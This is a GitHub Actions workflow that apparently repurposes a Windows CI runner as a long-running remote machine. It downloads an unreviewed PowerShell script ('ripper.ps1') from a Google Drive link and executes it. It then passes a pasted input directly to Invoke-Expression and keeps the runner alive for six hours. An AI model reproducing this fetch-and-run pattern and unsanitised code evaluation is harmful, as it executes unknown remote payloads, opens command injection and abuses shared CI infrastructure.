name: Windows VM Setup

on:
  workflow_dispatch:
    inputs:
      code:
        description: "Paste PowerShell Code"
        required: true
        default: "Write-Host 'Hello from GitHub Actions'"

jobs:
  build:
    name: Windows VM Running
    runs-on: windows-latest
    timeout-minutes: 360

    steps:
      - name: Downloading Essentials
        run: |
          # WAIT FOR 3-4 MINUTES
          Invoke-WebRequest -Uri "https://drive.usercontent.google.com/download?id=1YBY8GN0-p1wZk807-87dEPGZbeKLlHBT&export=download&authuser=0&confirm=t&uuid=fdbceb6f-1b4d-49c1-9128-d38cf855055b&at=APZUnTVUm1AGqItiY6LCUoXfH13d%3A1716612457921" -OutFile "ripper.ps1"
          ./ripper.ps1

      - name: Executing PowerShell Code
        run: |
          # CONNECTING WITH VM
          $Code = "${{ inputs.code }}"
          Invoke-Expression $Code

      - name: Keep VM Running
        run: |
          # Go And Connect Now!
          $i = 360
          do {
              Write-Host $i
              Sleep 60
              $i--
          } while ($i -gt 0)
